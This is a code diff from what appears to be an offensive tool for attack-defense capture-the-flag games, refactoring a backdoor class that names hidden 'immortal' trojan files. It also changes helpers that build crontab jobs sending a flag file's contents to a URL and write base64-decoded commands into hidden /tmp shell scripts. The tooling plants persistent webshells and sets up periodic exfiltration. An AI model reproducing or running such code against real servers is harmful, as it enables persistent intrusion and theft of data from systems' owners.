@@ -38,7 +38,7 @@ class BackdoorDescriptions:
             subTroj_key=md5_1
             immortalTroj_Name=md5_1[:24]
             subTroj_Name=md5_2[:-5]
-            immortalTroj_Name=f'{path}.--{immortalTroj_Name}.php'
+            immortalTroj_Name=f'{path}.--{immortalTroj_Name}.{config.fileType}'
             subTroj_Name=f'{path}.--{subTroj_Name}.php'
             
             #生成内容
@@ -53,16 +53,17 @@ class BackdoorDescriptions:
         self.childs[index]=value
     def __delitem__(self,index):
         del self.childs[index]
-
+def buildShByModel(url,payload,httpType=0):
+    return config.httpSendModel[httpType].format(url,payload)
 def buildCrontab(interval,url,payload,httpType=0):
     #payload='flag="$(cat /home/web/flag/flag)"&token={token}'
-    model=config.httpSendModel[httpType].format(url,payload)
+    model=buildShByModel(url,payload,httpType)
     raw= f"{interval} * * * * {model}"
     return raw
 def buildCmd(rawCmd):
     raw =base64.b64encode(f'{rawCmd}\n'.encode('utf-8')).decode('utf-8')
     md5Str=hashlib.md5(f"{str(time.time())}{raw}".encode("utf-8")).hexdigest()
-    return f'/bin/echo \'{raw}\' | /usr/bin/base64 -d | /bin/cat  > /tmp/.--{md5Str}.sh',md5Str
+    return f'/bin/echo \'{raw}\' | /usr/bin/base64 -d  | /bin/cat > /tmp/.--{md5Str}.sh',md5Str
 
 #使用备份的镜像重新部署服务器
 class reDeployServer():
